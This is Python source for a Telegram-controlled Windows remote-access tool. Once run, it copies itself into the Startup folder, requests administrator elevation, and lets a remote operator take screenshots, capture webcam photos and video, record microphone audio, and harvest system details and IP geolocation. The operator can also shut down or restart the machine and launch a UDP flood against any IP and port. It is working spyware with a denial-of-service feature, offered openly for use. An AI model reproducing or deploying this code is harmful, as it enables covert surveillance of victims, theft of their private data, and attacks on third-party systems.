
from PIL import ImageGrab
import getpass
import os
import telebot
import os.path
import webbrowser
import requests
import win32api
import platform
import time
import cv2
import sys
from os.path import basename
from base64 import encodebytes
import random
from time import sleep
import psutil
import GPUtil
import tkinter, socket
from tkinter import *  
from tkinter import messagebox  
from cv2 import VideoWriter
from cv2 import VideoWriter_fourcc
import wave
import pyaudio

import pyautogui as p

import ctypes

import ctypes, sys
user_path = os.path.expanduser('~') 
USER_NAME = getpass.getuser()
f = open(f"{user_path}\\AppData\\Roaming\\temp.txt",'r')
usid=int(f.readline())
token=str(f.readline())
f.close()
bot = telebot.TeleBot(token)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
result = requests.get("https://gist.githubusercontent.com/bagaZh/8190cb05ca014a81d6fad8ff61bf2e33/raw/80b78c7ee5ea2b7cbfffd8c3b6c339580873b278/version.txt")
last_ver = result.content.decode("utf-8")
a = open(f"{user_path}\\AppData\\Roaming\\version.txt", "r")
current_ver = a.read()
a.close()
if "RX" in last_ver: iadm=0
else: iadm=1
if last_ver != current_ver:
    bot.send_message(usid, f'Найдено новое обновление {last_ver}, для обновления нажмите ---> /update')

if is_admin() or iadm==1:
    
    Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
    Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
    tfn=Thisfile.replace(Thisfile_name, "")
    user_path = os.path.expanduser('~') # Путь к папке пользователя

    
    os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
    os.system(f'copy "{tfn}version.txt" "{user_path}\\AppData\\Roaming"')

    while True:
        try:
            p.FAILSAFE = False
            USER_NAME = getpass.getuser()
            f = open(f"{user_path}\\AppData\\Roaming\\temp.txt",'r')
            usid=int(f.readline())
            token=str(f.readline())
            f.close()
            fl=0
            bot = telebot.TeleBot(token)
            @bot.message_handler(commands=["start"])
            def screen(message, res=False):
                if message.chat.id==int(usid) or fl==1:
                    try:
                        bot.send_message(message.chat.id, """
                            \n MADE BY L baga
                            \n Дискорд сервер L baga - https://discord.gg/PXXHeSDdym
                            \n/help - Все команды""")
                    except Exception as e:
                        bot.reply_to()
                else:
                    bot.send_message(message.chat.id, "Чел, тебя не ждали, иди куда-подальше")
            @bot.message_handler(commands=["help"])
            def screen(message, res=False):
                if message.chat.id==usid:
                    try:
                        bot.send_message(message.chat.id, """
                            Мои команды:
                            \n MADE BY L baga
                            \n Дискорд сервер L baga - https://discord.gg/PXXHeSDdym
                            \n/screen - Скриншот
                            \n/pc_info - Данные о пк
                            \n/webp - Фото с веб камеры
                            \n/open_link https://ссылка - Открывает ссылку в браузере и присылает скриншот
                            \n/msgbox текст - Выводит окно с вашим текстом
                            \n/webcamvideo длительность в цифрах 1000 примерно 39 секунды - Записать видео с веб камеры
                            \n/audio длительность в цифрах 1000 примерно 23 секунды - Запись аудио с пк
                            \n/volumeON - Включит максимальную громкость
                            \n/volumeOFF - Выключит звук
                            \n/shutdown - Выключит пк
                            \n/restart - Перезагрузит пк
                            \n/ddos ip port packets - ddos. Пример: '/ddos 127.0.0.0 5674 50' пакеты лучше ставить не больше 100
                            \n/update - Откроет ссылку для обновления до актуальной версии
                            \n/altf4 - Исполнит сочетание клавиш alf + f4
                            \n/hidePG - Свернёт все окна
                            \n/smspam ru/bu number - В разработке...""")
                    except Exception as e:
                        bot.reply_to()
                else:
                    bot.send_message(message.chat.id, "Чел, тебя не ждали, иди куда-подальше")
            @bot.message_handler(commands=["screen"])
            def screen(message, res=False):
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                screen = ImageGrab.grab()
                screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
                f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
                bot.send_document(message.chat.id,f)
                try:
                    os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\sreenshot.png')
                except:
                    pass



            @bot.message_handler(commands=["pc_info"])
            def pc_info(message, res=False):
                bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                try:
                    def get_size(bytes, suffix="B"):
                        factor = 1024
                        for unit in ["", "K", "M", "G", "T", "P"]:
                            if bytes < factor:
                                return f"{bytes:.2f}{unit}{suffix}"
                            bytes /= factor
                    uname = platform.uname()

                    namepc = "\nИмя пк: " + str(uname.node)
                    countofcpu = psutil.cpu_count(logical=True)
                    allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu) 

                    cpufreq = psutil.cpu_freq()
                    cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'


                    svmem = psutil.virtual_memory()
                    allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
                    ramfree = "\nДоступно: " + str(get_size(svmem.available))
                    ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

                    partitions = psutil.disk_partitions()
                    for partition in partitions:
                        nameofdevice = "\nДиск: " + str(partition.device)
                        nameofdick = "\nИмя диска: " + str(partition.mountpoint)
                        typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
                        try:
                            partition_usage = psutil.disk_usage(partition.mountpoint)
                        except PermissionError:

                            continue
                        allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
                        usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
                        freestorage = "\nСвободно: " + str(get_size(partition_usage.free))



                    try:
                        gpus = GPUtil.getGPUs()
                        list_gpus = []
                        for gpu in gpus:

                            gpu_name = "\nМодель видеокарты: " + gpu.name

                            gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

                            gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

                            gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
                    except:
                        bot.send_message(message.chat.id, 'Видеокарты нету либо она встроенная')

                    headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    }
                    drives = str(win32api.GetLogicalDriveStrings())
                    drives = str(drives.split('\000')[:-1])

                    try:
                        ip = requests.get('https://api.ipify.org').text
                        urlloc = 'http://ip-api.com/json/'+ip
                        location1 = requests.get(urlloc, headers=headers).text
                    except:
                        pass
                    all_data = "Time: " + time.asctime() + '\n' + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
                    bot.send_message(message.chat.id, all_data)
                except Exception as e:
                    bot.reply_to(message, e)

            @bot.message_handler(commands=["webp"])
            def screen(message, res=False):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    cap = cv2.VideoCapture(0)
                    for i in range(30):
                        cap.read()
                    ret, frame = cap.read()
                    cv2.imwrite(os.getenv("APPDATA") + '\\4543t353454.png', frame)   
                    cap.release()
                    webcam = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png','rb')
                    bot.send_document(message.chat.id, webcam)
                    try:
                        os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\4543t353454.png')
                    except:
                        pass
                except:
                    bot.send_message(message.chat.id, 'У пк нету веб камеры.')


            @bot.message_handler(commands=["open_link"])
            def screen(message, res=False):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    webbrowser.open_new(message.text.split()[1])
                    sleep(2)
                    screen = ImageGrab.grab()
                    screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
                    f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
                    bot.send_document(message.chat.id,f)
                    try:
                        os.remove('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming' + '\\sreenshot.jpg')
                    except Exception as e:
                        bot.send_message(message.chat.id, 'Скриншот сделать удалось, но не получилось удалить скриншот после отправки:(\nКод ошибки:\n' + str(e))
                    bot.send_message(message.chat.id, 'Успешно открыта ссылка! Вот скриншот')
                except Exception as e:
                    bot.send_message(message.chat.id, 'Не удалось открыть ссылку, используй такой формат: /open_link https://ссылка\nКод ошибки:\n' + str(e))


            
            @bot.message_handler(commands=["ddos"])
            def flood(message):
                bot.send_message(usid, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета')
                victim=message.text.split()[1]
                vport=message.text.split()[2]
                duration=message.text.split()[3]
                victim=str(victim)
                vport=int(vport)
                duration=float(duration)
                client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(20000)
                timeout =  time.time() + duration
                sent = 3000

                while 1:
                    if time.time() > timeout:
                        break
                    else:
                        pass
                    client.sendto(bytes, (victim, vport))
                    sent = sent + 1
                bot.send_message(usid, 'ddos успешно закончен!')

            @bot.message_handler(commands=["msgbox"])
            def screen(message, res=False):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    top = Tk()  
                    top.geometry("700x700")      
                    text = ' '.join([str(elem) for elem in message.text.split()])
                    text1 = text.replace('/msgbox ', '')
                    label = Label(text=text1, fg="#eee", bg="#333", font="Arial 20")  
                    label.place(relx=.2, rely=.3)
                    top.mainloop()
                    screen = ImageGrab.grab()
                    screen.save('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg')
                    f = open('C:\\Users\\' + USER_NAME + '\\AppData\\Roaming\\' + '\\sreenshot.jpg',"rb")
                    bot.send_document(message.chat.id,f)
                except Exception as e:
                    bot.reply_to(message, e)



            @bot.message_handler(commands=['webcamvideo'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    try:# open the webcam video stream
                        webcam = cv2.VideoCapture(0)

                        # open output video file stream
                        video = VideoWriter('webcam.avi', VideoWriter_fourcc(*'MP42'), 25.0, (640, 480))

                        # main loop
                        for x in range(1,int(message.text.split()[1])):
                            # get the frame from the webcam
                            stream_ok, frame = webcam.read()
                            
                            # if webcam stream is ok
                            if stream_ok:
                                # display current frame
                                # cv2.imshow('Webcam', frame)
                                
                                # write frame to the video file
                                video.write(frame)
                        bot.send_document(message.chat.id, open('webcam.avi', 'rb'))
                    except Exception as e:
                        bot.reply_to(message, e)
                        # escape condition


                    # clean ups
                    cv2.destroyAllWindows()

                    # release web camera stream
                    webcam.release()

                    # release video output file stream
                    video.release()
                except Exception as e:
                    bot.reply_to(message, e)


            @bot.message_handler(commands=['audio'])
            def audio(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    audio = pyaudio.PyAudio()

                    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)

                    frames = []

                    try:
                        for i in range(1,int(message.text.stripe()[1])):
                            data = stream.read(1024)
                            frames.append(data)

                    except Exception as e:
                        bot.reply_to(message, e)


                    stream.stop_stream()
                    stream.close()
                    audio.terminate()

                    sound_file = wave.open('audio.wav', 'wb')
                    sound_file.setnchannels(1)
                    sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
                    sound_file.setframerate(44100)
                    sound_file.writeframes(b''.join(frames))
                    sound_file.close()
                    bot.send_document(message.chat.id, open('audio.wav', 'rb'))
                except Exception as e:
                    bot.reply_to(message, e)







            
            @bot.message_handler(commands=['update'])
            def update(message, res=True):
                try:
                    bot.reply_to(message, 'Обновляемся...')
                    result = requests.get("https://gist.github.com/bagaZh/8190cb05ca014a81d6fad8ff61bf2e33/raw/235b35e4c11a52323ec10366da4037081af7e133/version.txt")
                    last_ver = result.content.decode("utf-8")
                    a = open(f"{user_path}\\AppData\\Roaming\\version.txt", "r")
                    current_ver = a.read()
                    a.close()
                    if last_ver != current_ver:
                        webbrowser.open("https://github.com/bagaZh/RC-PC")
                        bot.reply_to(message, 'На компьюторе была открыта ссылка для обновления. Для обновление требуется запустить файл stop-for-update.bat или использовать комаду /exit, затем скачать все файлы заного(кроме setup.exe и s-f-u.bat) и запустить RC-PC.exe')
                    else:
                        bot.reply_to(message, f'У вас уже установлена последняя версия ({current_ver})')

                except Exception as e:
                    bot.reply_to(message, e)
            @bot.message_handler(commands=['exit'])
            def exits(message, res=True):
                try:
                    bot.reply_to(message, 'Пока пока!')
                    os.system("taskkill /IM RC-PC.exe")
                    

                except Exception as e:
                    bot.reply_to(message, e)
            @bot.message_handler(commands=['volumeOFF'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    p.hotkey('volumemute')
                    bot.reply_to(message, 'Звук успешно был выключен')
                except Exception as e:
                    bot.reply_to(message, e)

            @bot.message_handler(commands=['volumeON'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    for x in range(1,100):
                        p.hotkey('volumeup')
                    bot.reply_to(message, 'Звук успешно был включен на 100%')
                except Exception as e:
                    bot.reply_to(message, e)

            @bot.message_handler(commands=['shutdown'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Выключаю пк...')
                    os.system('shutdown /s /t 0')
                except Exception as e:
                    bot.reply_to(message, e)

            @bot.message_handler(commands=['altf4'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    p.hotkey('alt','f4')
                    bot.reply_to(message, 'Успешно!')
                except Exception as e:
                    bot.reply_to(message, e)


            @bot.message_handler(commands=['hidePG'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, ожидайте, отклик бота, зависит от скорости интернета пк\n MADE BY L baga')
                    p.hotkey('win','d')
                    bot.reply_to(message, 'Успешно!')
                except Exception as e:
                    bot.reply_to(message, e)

        


            @bot.message_handler(commands=['restart'])
            def video(message, res=True):
                try:
                    bot.reply_to(message, 'Перезагружаю пк...')
                    os.system('shutdown /r /t 0')
                except Exception as e:
                    bot.reply_to(message, e)

            @bot.message_handler(content_types=['voice'])
            def repeat_all_message(message, res=True):
                try:
                    bot.reply_to(message, 'Команда принята, если я молчу значит команда выполняется. Когда она законьчиться я отвечу.\n MADE BY L baga')
                    file_info = bot.get_file(message.voice.file_id)
                    file = requests.get('https://api.telegram.org/file/bot{0}/{1}'.format(token, file_info.file_path))
                    with open('voice.ogg','wb') as f:
                        f.write(file.content)
                    os.system('voice.ogg')
                    bot.reply_to(message, 'Успешно')
                except Exception as e:
                    bot.reply_to(message, e)


            @bot.message_handler(content_types=['text'])
            def hello(message, res=False):
                try:
                    bot.reply_to(message, 'Чувак я не знаю что ответить на это, используй /help Для получения списка моих команд\n MADE BY L baga')
                except Exception as e:
                    bot.reply_to(message, e)
            bot.polling()
        except Exception as e: 
            print(e)
        
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
